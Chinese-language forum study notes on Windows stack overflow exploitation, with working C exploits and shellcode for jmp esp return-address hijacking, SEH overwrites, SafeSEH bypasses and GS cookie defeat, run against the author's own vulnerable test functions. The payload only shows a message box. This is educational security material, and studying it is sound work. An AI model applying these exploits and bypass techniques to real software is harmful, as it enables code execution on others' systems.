> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271171.htm)

> [原创]Windows 平台下栈溢出漏洞学习笔记

一. 漏洞原理  

==========

1. 漏洞成因  

----------

要理解该漏洞的成因，最重要的是要理解函数执行细节，具体细节可以参考：[**从反汇编的角度学 C/C++ 之函数**](https://bbs.pediy.com/thread-269590.htm)。简单来说，由于程序使用 call 指令调用函数的时候，会改变 eip 的值，以此来修改程序要执行的指令的地址。而为了让程序在执行完函数以后可以正确返回到调用完函数以后要执行的指令地址，在通过 call 指令调用函数的时候，除了会修改 eip 为函数的地址，也会将 call 指令的下一条指令地址（返回地址）保存在栈中。同时，在 Debug 模式下，函数内部也会保存调用函数前的 ebp 的值，并将 ebp 的值调整到栈顶。接着将栈顶指针 esp 减去一定的大小，开辟出一段栈空间，用来将局部变量保存在栈中，此时 esp 指向的就是开辟的这段栈空间的栈顶，ebp 指向的是栈空间的栈底，最终形成的栈的局部就会如下图所示：

![](https://bbs.pediy.com/upload/attach/202201/835440_FC3P72SDKG3DR9K.jpg)

此时就可以通过 ebp 来方便的对局部变量和参数进行操作，[ebp - X] 就可以获取相应的局部变量，[ebp + 0x8 + X] 就可以获得相应的参数。而函数返回的时候，函数会通过 mov esp, ebp 指令，将栈顶 esp 指针指向栈底指针 ebp，接着指向 pop ebp 将保存的原 ebp 的值赋值给 ebp，此时 esp 将指向保存返回地址的栈地址。最终函数通过调用 retn 指令来退出函数，该指令会将 esp 指向的栈地址中所保存的返回地址赋值给 eip。也就是说，函数执行完毕之后，继续执行的指令地址此时就会由在栈中保存的返回地址来决定。

由上图可知，保存返回地址和原 ebp 的栈地址是紧跟在局部变量后面的。如果函数没有对用户输入的数据长度进行验证，就将输入的数据保存在局部变量中，就很有可能导致输入的数据覆盖掉返回地址。这样，就导致了返回地址被修改，那么函数退出以后要执行的指令的地址就会变成覆盖以后所指定的地址。

如下的代码执行的功能很简单，仅仅是将 pSzInput 指向的字符串复制到局部变量 szStr 中。但是，此时函数并没有对 pSzInput 所指向的字符串的长度进行验证，且 strcpy 函数也只是以 0x0 作为字符串结束符，将 pSzInput 所指向的字符串复制到局部变量 szStr 中。此时，如果 pSzInput 所指向的字符串长度大于 0x8，就会导致复制完以后的数据溢出局部变量 szStr 的栈空间，导致覆盖掉返回地址产生漏洞。

```
void test(char *pSzInput)
{
    char szStr[0x8] = { 0 };
 
    strcpy(szStr, pSzInput);
}

```

接下来通过调试器来观察数据的保存，首先通过如下代码查看正常情况下，也就是输入数据的长度小于 0x8 的时候，数据是如何保存的。  

```
int main()
{
    char szInput[0x100] = { 0 };
    int iInputLen = 0x8;
 
    memset(szInput, 'A', iInputLen);
    test(szInput);
 
    system("pause");
 
    return 0;
}

```

将程序运行到 strcpy 函数调用前，此时 ecx 保存的就是要赋值的目标字符串的地址，可以看到在赋值前，该数组的元素都是 0。紧邻这个数组后面的栈地址，所保存的就是原 ebp 以及返回地址。  

![](https://bbs.pediy.com/upload/attach/202201/835440_K5PFECMXQZVVX7G.jpg)

执行完 strcpy 函数以后，数组中的元素都变成了 0x41，也就是字符'A'对应的 asscill 码值。  

![](https://bbs.pediy.com/upload/attach/202201/835440_R4VKY6298WF5478.jpg)

紧跟该数组保存的就是原 ebp 和返回地址的值。因为输入数据的长度没有超过数据 szStr 的大小 (0x8)，因此，原 ebp 和返回地址并没有被覆盖掉，函数可以正常返回到调用函数的指令的下一条指令开始正常运行。

但是，如果此时输入数据的长度超过局部变量数组 szStr 的长度 (0x8) 的话，输入数据就会将原 ebp 以及返回地址覆盖掉。接下来，将输入数据的长度修改为 0x10，这样就可以刚好覆盖掉原 ebp 和返回地址。

```
int main()
{
    char szInput[0x100] = { 0 };
    int iInputLen = 0x10;
 
    memset(szInput, 'A', iInputLen);
    test(szInput);
 
    system("pause");
 
    return 0;
}

```

此时，调用完 strcpy 以后，可以看到输入数据将原 ebp 以及返回地址全部覆盖掉了，修改成了字符'A'对应的 asscill 值。  

![](https://bbs.pediy.com/upload/attach/202201/835440_URSXAN926BXFSV9.jpg)

函数继续运行，在运行 retn 指令返回函数前，可以看到 esp 所指向的栈地址中保存的返回地址被修改成了 0x41414141。

![](https://bbs.pediy.com/upload/attach/202201/835440_WZTWJF4CVHUPPSG.jpg)

接着执行 retn 指令，程序就会将 eip 修改为 0x41414141。

![](https://bbs.pediy.com/upload/attach/202201/835440_U7DAQCM24FNQ6JJ.jpg)

由于 0x41414141 这个地址没有保存合法的指令，因此程序会抛出异常。  

![](https://bbs.pediy.com/upload/attach/202201/GE5JN9RURWYEETD.jpg)

2. 漏洞利用  

----------

由上内容可以知道，可以通过控制输入数据的长度和数值实现对返回地址的修改。这样，当函数执行 retn 指令退出函数的时候，就会将 eip 修改为指定的地址，而在该地址中，如果保存想要运行的指令了，就成功利用了该漏洞实现了对程序的劫持。

由于，此时只能控制栈中保存的数据，所以要执行的指令就只能保存在栈中。因此，想要执行保存在栈中的指令，就需要将 eip 修改为栈中的地址，这样就会运行保存在栈中的指令。

而实现该功能的最佳选择就是 jmp esp 指令，该指令对应的指令编码是 0xFFE4。因此，可以想办法在程序中找到这条指令的地址，修改程序的返回地址为保存该指令的地址，这样退出函数的时候，程序就会跳转到 jmp esp 指令。通过该指令，eip 就会修改为 esp 中保存的地址，而在通过 retn 指令退出函数的时候，该指令会将 esp 加 4，也就是说此时的 esp 指向的是保存返回地址的栈地址的随后的地址。

而 jmp esp 指令的地址，最好从 ntdll.dll 中获取，因为该 dll 是最早映射到进程空间的 dll，因此它在每个进程中的地址基本是一致的。在我的测试系统上，ntdll.dll 中保存该指令的地址是 0x7C961EED。因此，可以通过将返回地址修改为该地址的方式，实现将 eip 修改为栈中空间的地址。

![](https://bbs.pediy.com/upload/attach/202201/835440_H7HNYP8G4E8KR8J.jpg)

现在已经可以让程序退出函数的时候，成功跳转到保存了返回地址的栈地址偏移 0x4 的地址继续执行。因此，此时只需要将要运行的指令跟在返回地址之后，就可以实现执行想要的代码，这段代码也成为 ShellCode。

下面就是一段简单的 ShellCode，功能是执行一个 MessageBox 函数，然后在调用 ExitProcess 退出程序，因此此时是因为 strcpy 产生的漏洞，所以，编写的 ShellCode 不能含有 0，否则的话就会被 strcpy 认为字符串已经结束，导致 ShellCode 运行失败。调用的函数 MessageBox 和 ExitProcess 需要是测试的机器上的地址，这个可以使用调试器获取。

```
char g_szShellCode[] = { 
              0x33, 0xDB,            // xor ebx, ebx
              0x53,               // push ebx，将字符串的结束符0压入栈中         
              0x68, 0x68, 0x61, 0x63, 0x6B,   // push 0x6B636168，将字符串"hack"压入栈中
              0x8B, 0xC4,            // mov eax, esp，将字符串的首地址赋给eax
              0x53,               // push ebx
              0x50,               // push eax
              0x50,               // push eax
              0x53,               // push ebx
              0xB8, 0x0B, 0x05, 0xD5, 0x77,   // mov eax, user32.MessageBox
              0xFF, 0xD0,            // call eax
              0x53,               // push ebx
              0xB8, 0xA2, 0xCA, 0x81, 0x7C,  // mov eax, user32.ExitProcess
              0xFF, 0xD0             // call eax
            };

```

最终完成漏洞利用的代码如下：  

```
int main()
{
    char szInput[0x100] = { 0 };
    int iJunkLen = 0x8;
    int iEbpLen = 0x4;
    int iRetLen = 0x4;
    DWORD dwRetAddr = 0x7C961EED;                    // jmp esp地址
     
    LoadLibrary("user32.dll");                    // MessageBox函数在该中，需要将其导入才可以调用
    memset(szInput, 'A', iJunkLen);                  // 覆盖局部变量szStr
    memset(szInput + iJunkLen, 'B', iEbpLen);                 // 覆盖ebp
    *(PDWORD)(szInput + iJunkLen + iEbpLen) = dwRetAddr;      // 覆盖返回地址
    strcpy(szInput + iJunkLen + iEbpLen + iRetLen, g_szShellCode);   // 保存ShellCode
    test(szInput);
 
    system("pause");
 
    return 0;
}

```

编译好程序以后，首先查看当 strcpy 运行完时的栈中数据可以看到，此时的原 ebp 和返回地址已经被覆盖掉，返回地址修改为了 ntdll.dll 中的地址。

![](https://bbs.pediy.com/upload/attach/202201/835440_JTJCMXXQHD2KRF3.jpg)

当执行 retn 指令的时候，此时的栈顶保存的就是 ntdll.dll 中的该地址。  

![](https://bbs.pediy.com/upload/attach/202201/835440_Z3PRURV3NCADP6S.jpg)

因此，继续执行 retn 指令，就会跳转到 ntdll.dll 中的地址执行，而该地址保存的指令就是 jmp esp。且此时的 esp 进行了 + 4 的操作，所以此时的 esp，就是紧跟在输入数据中返回地址后的 ShellCode。  

![](https://bbs.pediy.com/upload/attach/202201/835440_9J5UE3GZGKCWJ4K.jpg)

因此，继续执行 jmp esp 指令，就会让程序跳转到在栈中保存的 ShellCode 执行。

![](https://bbs.pediy.com/upload/attach/202201/835440_W6RRA8UDMWMVGYR.jpg)

继续执行 ShellCode 就会弹窗后退出函数。

![](https://bbs.pediy.com/upload/attach/202201/YBF78ESN9VUHCN3.jpg)

二. Windows 安全机制  

==================

为了缓解栈溢出漏洞带来的问题，微软提供了如下的内存保护措施：

*   增加了对 S.E.H 的安全机制，能够有效地挫败绝大多数通过改写 S.E.H 而劫持进程地攻击
    
*   使用 GS 编译技术，在函数返回地址之前加入了 Security Cookie，在函数返回前首先检测 Security Cookie 是否被覆盖，从而把针对操作系统的栈溢出变得非常困难
    
*   DEP（数据执行保护）将数据部分标识为不可执行，阻止了栈中攻击代码的执行
    
*   ASLR（加载地址随机）技术通过对系统关键地址的随机化，使得经典栈溢出手段失效
    
*   SEHOP（S.E.H 覆盖保护）作为对安全 S.E.H 机制的补充，SEHOP 将 S.E.H 的保护提升到系统级别，使得 S.E.H 的保护机制更为有效
    

接下来将一一对这些技术进行介绍。

三. 通过 SEH 实现漏洞利用  

===================

1. 利用原理  

----------

SEH 即异常处理结构体，它是 Windows 异常处理机制所采用的重要数据结构。每个 SEH 包含两个 DWORD 指针：SEH 链表指针和异常处理函数句柄，共八字节，如下图所示：  

![](https://bbs.pediy.com/upload/attach/202201/835440_6VJX5SVAYAV7BA4.jpg)

SEH 的结构体是保存在系统栈中的，栈中一般会同时存在多个 SEH。这些 SEH 会通过链表指针由栈顶向栈底串成单项链表，位于链表最顶端的 SEH 通过 TEB 偏移为 0 字节所保存的指针标识，如下图所示。  

![](https://bbs.pediy.com/upload/attach/202201/835440_UBFZTDVUG9T462R.jpg)

当异常发生时，操作系统会中断程序，并首先从 TEB 的 0 字节偏移处取出距离栈顶最近的 SEH，使用异常处理函数句柄所指向的代码来处理异常。当离 “事故现场” 最近的异常处理函数运行失败时，将顺着 SEH 链表以此尝试其他的异常处理函数。如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。  

由于 SEH 是存放在栈中的，因此如果数据溢出缓冲区，那么就很有可能会淹没掉 SEH。以下就是利用 SEH 来产生攻击的步骤：  

1.  精心制造的溢出数据可以把 SEH 中异常处理函数的入口地址更改为 shellcode 的起始地址
    
2.  溢出后错误的栈往往会触发异常
    
3.  当 Windows 开始处理溢出后的异常时，会错误地把 shellcode 当作异常处理函数而执行  
    

接下来依然使用上面有栈溢出漏洞的 test 函数作为测试，但是此时需要在栈中注册一个结构化异常处理器。注册的方式也很简单，只要在栈中保存一份 SEH 结构体即可，且异常处理函数指针指向的函数满足如下的格式：  

```
EXCEPTION_DISPOSITION except_handler(_EXCEPTION_RECORD *ExceptionRecord,
                     void *EstablisherFrame,
                     _CONTEXT *ContextRecord,
                     void *DispatcherContext);

```

因此对于函数的调用，要改成如下的代码：  

```
// 注册异常处理器
__asm
{
    push except_handler        // 处理器结构指针
    push fs:[0]            // 前一个结构化异常处理器的地址
    mov fs:[0], esp       // 登记新的结构
}
 
test(szInput);
 
// 销毁异常处理器
__asm
{
    mov eax, [esp]        // 从栈顶取得前一个异常登记结构的地址
    mov fs:[0], eax       // 将前一个异常结构的地址赋给
    add esp, 8            // 清理栈上的异常登记结构
}

```

由于要覆盖的是异常处理函数地址，所以要计算 test 函数中的局部变量具体 SEH 结构的偏移，这样才可以构造足够长度的输入数据来覆盖第一个异常处理函数之前的栈空间，然后才可以覆盖掉异常处理函数的地址。  

因此首先要在调试器中中断到 test 函数的 strcpy 函数的调用处。

![](https://bbs.pediy.com/upload/attach/202201/835440_FPB944N2MAGKKT8.jpg)

可以看到此时局部变量的保存地址是 0x12FE00，异常处理函数的保存地址是 0x12FE18。因此，局部变量地址距离 SEH 结构的地址相差 0x18，首先就需要对这 0x18 大小的栈空间进行覆盖，随后在的 4 字节覆盖的就是异常处理函数的地址，可以将其覆盖为 shellcode 的地址，这样程序出现异常的时候就会跳转到 shellcode 的地址继续执行。据此，可以写出如下的漏洞利用代码：

```
int main()
{
    char szInput[0x100] = { 0 };
    int iJunkLen = 0x18;
     
    LoadLibrary("user32.dll");                     // MessageBox函数在该中，需要将其导入才可以调用
    memset(szInput, 'A', iJunkLen);               // 覆盖异常处理函数之前的数据
    *(PDWORD)(szInput + iJunkLen) = (DWORD)g_szShellCode;    // 将异常处理函数修改为SellCode的地址
     
    // 注册异常处理器
    __asm
    {
        push except_handler                      // 处理器结构指针
        push fs:[0]                         // 前一个结构化异常处理器的地址
        mov fs:[0], esp                    // 登记新的结构
    }
     
    system("pause");
    test(szInput);
     
    // 销毁异常处理器
    __asm
    {
        mov eax, [esp]                   // 从栈顶取得前一个异常登记结构的地址
        mov fs:[0], eax                  // 将前一个异常结构的地址赋给
        add esp, 8                       // 清理栈上的异常登记结构
    }
 
    system("pause");
 
    return 0;
}

```

在调试器中可以看到，当 test 函数执行完 strcpy 以后，SEH 结构被覆盖掉，此时异常处理函数指向了 shellcode 的地址  

![](https://bbs.pediy.com/upload/attach/202201/835440_FQ8DEVU6SPDPX7U.jpg)  

程序继续向下运行，由于返回地址被修改会 0x41414141，所以执行 retn 指令会出现异常。在处理异常的过程中，就会执行 shellcode。

2.SafeSEH
---------

在 Windows XP SP2 及后续版本的操作系统中，微软引入了 SEH 校验机制 SafeSEH。SafeSEH 的原理很简单，在程序调用异常处理函数前，对要调用的异常处理函数进行一系列的有效性校验，当发现异常处理函数不可靠时将终止异常处理函数的调用。SafeSEH 实现需要操作系统与编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。

在编译器层面，编译器通过启用 / SafeSEH 链接选项可以让编译好的程序具备 SEH 功能，这一链接选项在 Visual Studio 2003 及后续版本中是默认启用的。启用该链接选项后，编译器在编译程序的时候将程序所有的异常处理函数地址提取出来，编入一张安全的 SEH 表，并将这张表放到程序的映像里面。当程序调用异常处理函数的时候会将函数地址与安全 SEH 表进行匹配，检查调用的异常处理函数是否位于安全 SEH 表中。

在系统层层面，SafeSEH 机制是在异常分发函数 RtlDispatchException 函数开始的，以下是其保护措施：  

1.  检查异常处理链是否位于当前程序的栈中。如果不在当前栈中，程序将终止异常处理函数的调用
    
2.  检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用
    
3.  在前两项检查都通过后，程序调用一个全新的函数 RtlIsValidHandler()，来对异常处理函数的有效性进行验证  
    

其中，RtlIsValidHandler 函数的执行流程如下：

首先，该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验：

*   判断程序是否设置了 IMAGE_DLLCHARACTERSTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略。所以这个标志被设置时，函数直接返回校验失败
    
*   检测程序是否包含 SEH 表。如果程序包含 SEH 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校言成功，匹配失败则返回校验失败
    
*   判断程序是否设置了 ILonly 标识。如果设置了这个标识，说明该程序只包含. NET 编译的中间语言，函数直接返回校验失败
    
*   判断异常处理函数地址是否位于不可执行页上。当异常处理函数地址位于不可执行页上，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常  
    

如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行 DEP 相关检测，函数依次进行如下校验：  

*   判断异常处理函数地址是否位于不可执行页上。当异常处理器函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出违例的异常
    
*   判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败
    

下图是 RtlDispatchException 函数的校验流程：  

![](https://bbs.pediy.com/upload/attach/202201/835440_9EFC9V3NF3HRTKK.jpg)

由于 SafeSEH 机制的存在，上述的漏洞利用方式就会无效。程序在检测到异常处理函数的异常以后，将会直接退出程序，而不会去执行 ShellCode。所以，要想成功利用漏洞，就需要绕过 SafeSEH 机制。  

3. 从堆中绕过 SafeSEH
----------------

由于当异常处理函数指向堆中的内存地址的时候，不会触发 SafeSEH 机制。因此，可以通过将 ShellCode 复制到堆中，同时将异常处理函数覆盖为保存了 ShellCode 的堆地址的方式来绕过 SafeSEH 机制，触发漏洞。  

此时的漏洞利用代码如下：

```
int main()
{
    char *buf = (char *)malloc(100);
    char szInput[0x100] = { 0 };
    int iJunkLen = 0x18;
     
    LoadLibrary("user32.dll");            // MessageBox函数在该中，需要将其导入才可以调用
     
    // 将ShellCode复制到堆中
    memset(buf, 0, 100);         
    strcpy(buf, g_szShellCode);
 
    memset(szInput, 'A', iJunkLen);         // 覆盖异常处理函数之前的数据
    *(PDWORD)(szInput + iJunkLen) = (DWORD)buf;   // 将异常处理函数修改为申请的堆的地址
     
    // 注册异常处理器
    __asm
    {
        push except_handler        // 处理器结构指针
        push fs:[0]            // 前一个结构化异常处理器的地址
        mov fs:[0], esp       // 登记新的结构
    }
     
    test(szInput);
     
    // 销毁异常处理器
    __asm
    {
        mov eax, [esp]        // 从栈顶取得前一个异常登记结构的地址
        mov fs:[0], eax       // 将前一个异常结构的地址赋给
        add esp, 8            // 清理栈上的异常登记结构
    }
 
    system("pause");
 
    return 0;
}

```

此时运行程序，则 ShellCode 就会顺利执行。  

4. 利用未启用 SafeSEH 模块绕过 SEH
-------------------------

当异常处理函数指向的地址在未开启 SafeSEH 模块的时候，也可以突破 SafeSEH 机制。如下图所示，此时的 SEH_NoSafeSEH_JUMP.dll 没有开启 SafeSEH。那就可以尝试从该模块中查找可以修改 eip 执行的指令，将异常处理函数的地址修改为该指令的地址，就可以实现对程序的劫持。

![](https://bbs.pediy.com/upload/attach/202201/835440_3RWCZFEWVPQAQKD.jpg)

在该模块中的 0x11121012 和 0x11121015 都有 pop + retn 组合的指令，这样的组合可以控制程序的运行。接下来用以下代码查看运行的细节：

```
int main()
{
    char szInput[0x100] = { 0 };
    int iJunkLen = 0x18;
     
    LoadLibrary("SEH_NoSafeSEH_JUMP.dll");              // 导入关闭SafeSEH的模块
    LoadLibrary("user32.dll");                  // MessageBox函数在该中，需要将其导入才可以调用
     
    memset(szInput, 'A', iJunkLen);               // 覆盖异常处理函数之前的数据
    *(PDWORD)(szInput + iJunkLen) = (DWORD)0x11121014;      // 要跳转到的未开启SafeSEH的模块的地址
     
    system("pause");
 
    // 注册异常处理器
    __asm
    {
        push except_handler        // 处理器结构指针
        push fs:[0]            // 前一个结构化异常处理器的地址
        mov fs:[0], esp       // 登记新的结构
    }
     
    test(szInput);
 
 
    // 销毁异常处理器
    __asm
    {
        mov eax, [esp]        // 从栈顶取得前一个异常登记结构的地址
        mov fs:[0], eax           // 将前一个异常结构的地址赋给
        add esp, 8            // 清理栈上的异常登记结构
    }
 
    system("pause");
 
    return 0;
}

```

运行程序以后，使用调试器对其进行附加，在程序执行完 strcpy 的时候可以看到异常处理函数地址已经被修改为未开启 SafeSEH 的模块的地址  

![](https://bbs.pediy.com/upload/attach/202201/835440_7CQYDGUFJSCD4WY.jpg)

在该地址下断点以后，继续运行程序，可以看到程序成功跳转到该处执行。此时已经证明，通过将异常处理函数地址修改为未开启 SafeSEH 模块的地址是可以绕过 SafeSEH。但是此时的 esp 的值变得过小 (和局部变量 szStr 相差 - 0x3C0)，导致漏洞难以利用，就没有再进一步尝试执行 ShellCode

![](https://bbs.pediy.com/upload/attach/202201/835440_WQG7F8VKAXVUZRJ.jpg)

5. 利用加载模块之外的地址绕过 SafeSEH
------------------------

一个进程会以共享的方式打开多个其他文件，此时保存这些文件内容的内存的类型是 Map 类型，如下图所示。SafeSEH 是无视它们的，当异常处理函数指针指向的是这些地址范围内，是不对其进行有效性验证的。因此，可以通过在这些模块中查找跳转指令，将指令地址覆盖给异常处理函数，就可以绕过 SafeSEH。

![](https://bbs.pediy.com/upload/attach/202201/835440_4PKTDRYCTCK2H4E.jpg)

基本上做法和上面的差不多，只不过这次换成了用共享内存的方式加载的其他模块中，然后问题也是同样的 (esp 太小)，不好利用，就不继续了。

四. SEHOP
========

SEHOP 是一种更为严厉的 SEH 保护机制，Windows7，Windows10 等系统均支持。想要开启 SEHOP，只需要在注册表的 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel** 下找到 DisableExceptionChainValidation 项，将该值设置为 0，即可启用 SEHOP，如下图所示：

![](https://bbs.pediy.com/upload/attach/202201/835440_HWQATEY3XF8A43D.jpg)

SEHOP 的核心任务就算上检查 SEH 链的完整性，在程序转入异常处理前 SEHOP 会检查 SEH 链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这条 SEH 链没有被破坏，程序可以去执行当前的异常处理函数；如果不是，则说明 SEH 链被破坏，可能发生了 SEH 覆盖攻击，程序将不会去执行当前的异常处理函数。

下图是典型的 SEH 攻击的流程，攻击时将 SEH 的异常处理函数地址覆盖为跳板指令地址，跳板指令根据实际情况进行选择。当程序出现异常的时候，系统会从 SEH 链中取出异常处理函数来处理异常，异常处理函数的指针已经被覆盖，程序的流程就会被劫持，在经过一系列跳转后转入 shellcode 执行。  

![](https://bbs.pediy.com/upload/attach/202201/835440_BSKPJ5AXYEQSXRW.jpg)

由于覆盖异常处理函数指针时同时覆盖了下一异常处理结构的指针，这样的话 SEH 链就会被破坏，从而被 SEHOP 检测出来。  

作为对 SafeSEH 强有力的补充，SEHOP 检查是在 SafeSEH 的 RtlIsValidHandler 函数检验前进行的，也就是说利用攻击模块之外的地址，堆地址和未启用 SafeSEH 模块的方法都行不通了。

想要突破 SEHOP 就要如下图所示，伪造异常链表，使最后一个异常处理结构的异常处理函数指向最终的异常处理函数。

![](https://bbs.pediy.com/upload/attach/202201/835440_PZKCJYGS73JTUE8.jpg)

伪造 SEH 链表绕过 SEHOP 需要具备以下这些条件：

*   图中的 0xXXXXXXXX 地址必须指向当前栈中，而且必须能够被 4 整除
    
*   0xXXXXXXXX 处存放的异常处理记录作为 SEH 的最后一项，其异常处理函数指针必须指向终极异常处理函数
    
*   突破 SEHOP 检查后，溢出程序还需要搞定 SafeSEH
    

五. GS 安全机制
==========

1. 保护原理  

----------

针对缓冲区溢出时会覆盖函数返回地址这一特征，微软的编译器在编译程序的时候引入了 GS 安全机制，在 Visual Studio 2003 及以后版本的 Visual Studio 中，可以通过项目属性页的配置属性 -> C/C++ -> 代码生成 -> 缓冲区安全检查来选择开启还是关闭 GS 安全机制。  

![](https://bbs.pediy.com/upload/attach/202201/835440_7C2BKG9TXZWFQUD.jpg)

GS 编译选项为每个函数调用增加了一些额外的数据和操作，用以检测栈中的溢出。

*   在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称为 "canary"，但如果使用 IDA 反汇编的话，会看到 IDA 将这个随机数标注为 "Security Cookie"。
    
*   "Security Cookie" 位于 EBP 之前，系统还将在. data 的内存区域中存放一个 Security Cookie 的副本，如图 10.1.2 所示
    
*   当栈中发生溢出时，Security Cookie 将被首先淹没，之后才是 EBP 和返回地址
    
*   在函数返回之前，系统将执行一个额外的安全验证操作，被称作 Security check
    
*   在 Security check 的过程中，系统将比较栈帧中原先存放的 Security Cookie 和. data 中副本的值，如果两者不吻合，说明栈帧中的 Security Cookie 已被破坏，即栈中发生了溢出
    
*   当检测到栈中发生溢出时，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行，如图 10.1.3 所示  
    

![](https://bbs.pediy.com/upload/attach/202201/835440_WX2SG54VVE8FVZ3.jpg)

![](https://bbs.pediy.com/upload/attach/202201/835440_JPMN4S2E325P3D6.jpg)

但是额外的数据和操作带来的直接后果就是系统性能的下降，为了将对性能的影响讲到最小，编译器在编译程序的时候并不是对所有的函数都应用 GS，以下的情况不会应用 GS：  

*   函数不包含缓冲区
    
*   函数被定义为具有变量参数列表
    
*   函数使用无保护的关键字标记
    
*   函数在第一个语句中包含内嵌汇编代码
    
*   缓冲区不是 8 字节类型且大小不大于 4 个字节  
    

从 Visual Studio 2005 开始，就引入了一个新的安全标识符

```
#pragma strict_gs_check

```

如下所示，可以通过该标识让不符合 GS 保护条件的函数添加 GS 保护

```
#pragma strict_gs_check(on)
void func()
{
    char szStr[4];
}

```

除了在返回地址前面添加 Security Cookie 外，在 Visual Studio 2005 及以后的版本中，还是用了变量重排技术，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量。同时，还会将指针参数和字符串参数赋值到内存中低地址，防止函数参数被破坏

如下图所示，在不启用 GS 的时候，如果变量 Buff 发生溢出变量 i，返回地址，函数参数 arg 等都会被覆盖，而启用 GS 后，变量 Buff 被重新调整到栈帧的高地址，因此当 Buff 溢出时不会影响变量 i 的值，虽然函数参数 arg 还是会被覆盖，但由于程序会在栈帧低地址处保存参数的副本，所以 Buff 的溢出也不会影响到传递进来的函数参数。

![](https://bbs.pediy.com/upload/attach/202201/835440_D5KWVEC4H76KRZQ.jpg)

对于上面存在漏洞的 test 函数，当它在开启了 GS 保护的编译器中编译出来的程序会如下所示，其中与未开启 GS 保护时候产生的代码的不同之处已用注释标识出来。

```
void test(char *pSzInput)
{
00401030  push        ebp  
00401031  mov         ebp,esp 
00401033  sub         esp,4Ch 
00401036  mov         eax,dword ptr [___security_cookie (456020h)]  // 将Security Cookie赋值给eax
0040103B  xor         eax,ebp                       // 将eax与ebp的值异或
0040103D  mov         dword ptr [ebp-4],eax               // 将异或以后的结果赋给[ebp - 4]
00401040  push        ebx  
00401041  push        esi  
00401042  push        edi  
    char szStr[0x8] = { 0 };
00401043  mov         byte ptr [ebp-0Ch],0 
00401047  xor         eax,eax 
00401049  mov         dword ptr [ebp-0Bh],eax 
0040104C  mov         word ptr [ebp-7],ax 
00401050  mov         byte ptr [ebp-5],al 
 
    strcpy(szStr, pSzInput);
00401053  mov         eax,dword ptr [ebp+8] 
00401056  push        eax  
00401057  lea         ecx,[ebp-0Ch] 
0040105A  push        ecx  
0040105B  call        strcpy (4013F0h) 
00401060  add         esp,8 
}
00401063  pop         edi  
00401064  pop         esi  
00401065  pop         ebx  
00401066  mov         ecx,dword ptr [ebp-4]       // 取出[ebp - 4]的值赋给ecx
00401069  xor         ecx,ebp                  // 将ecx的值与ebp异或                      
0040106B  call        __security_check_cookie (4014F0h)  // 调用Security Check函数
00401070  mov         esp,ebp 
00401072  pop         ebp  
00401073  ret

```

由上内容可知，Security Cookie 产生的细节如下：  

*   系统以. data 节的第一个双子作为 Cookie 的种子，或称原始 Cookie（所有函数的 Cookie 都是用这个 DWORD 生成）
    
*   在程序每次运行时 Cookie 的种子都不同，因此种子有很强的随机性
    
*   在栈帧初始化以后系统用 EBP 异或种子，作为当前函数的 Cookie，以此作为不同函数之间的区别，并增加 Cookie 的随机性
    
*   在函数返回前，用 EBP 还原出（异或）Cookie 的种子
    

2. 突破 GS 保护
-----------

由此可以知道，想要突破 GS 保护，需要同时对保存在. data 中的 Cookie 和保存在栈中的 Cookie 进行修改。

考虑如下代码，此时的 buf 指针会指向一个堆空间，参数 i 因为是个有符号整型，因此当它为负数的时候依然会进入到 if 语句中，此时就可以通过计算堆变量的地址与. data 节中保存的 Security Cookie 的地址来得出 i 值应该如何输入可以改变. data 中的 Security Cookie。

```
void test(char *pSzInput, char *buf, int i)
{
    char szStr[0x8] = { 0 };
    if (i < 0x100)
    {
        *(PDWORD)(buf + i) = *(PDWORD)pSzInput;
        strcpy(szStr, pSzInput);
    }
}

```

经过调试器验证发现，申请的堆变量地址为 0x00455020，Security Cookie 的地址为 0x00460068，两者相差 - 0xB048。因此，当参数 i 的值为 - 0xB048 的时候，可以直接修改. data 中保存的 Security Cookie。此时，可以选择 0x90909090 作为修改以后的值，而同时还要获取程序在该函数运行到 Security Check 的时候寄存器 ebp 的值，这样才可以算出保存在栈中的 Security Cookie 的值。同样经过调试器验证发生，此时的 ebp 的值为 0x0012FDFC，与写入的 Security Cookie 的值进行异或得到的值是 0x90826E90。  

只要将栈中的 Security Cookie 和. data 中的 Security Cookie 的值修改到可以通过验证，剩下的工作就是最上面的修改返回地址为 jmp esp 的地址。最终完整的漏洞利用代码如下：

```
int main()
{
    char *buf = (char *)malloc(0x10000);
    char szInput[0x100] = { 0 };
    int iSize = 4;
 
    LoadLibrary("user32.dll");                          // MessageBox函数在该DLL中，需要将其导入才可以调用
     
    *(PDWORD)szInput = 0x90909090;                            // 用来修改.data中的Security Cookie值
    memset(szInput + iSize, 'A', iSize);                    // 覆盖局部变量szStr
    *(PDWORD)(szInput + iSize + iSize) = 0x90826E90;  // 覆盖栈中的Security Cookie
    memset(szInput + iSize + iSize + iSize, 'B', iSize);    // 覆盖ebp
    *(PDWORD)(szInput + iSize + iSize + iSize + iSize) = 0x7C961EED;         // 覆盖返回地址为jmp esp指令地址
    strcpy(szInput + iSize + iSize + iSize + iSize + iSize, g_szShellCode);   // 复制ShellCode
     
    test(szInput, buf, -0xB048);
     
    system("pause");
 
    return 0;
}

```

编译后程序后，在调试器中 strcpy 函数后面下断点，可以看到此时. data 中的 Security Cookie 已经被成功修改为 0x90909090，栈中的 Security Cookie 和返回地址也都被成功覆盖。  

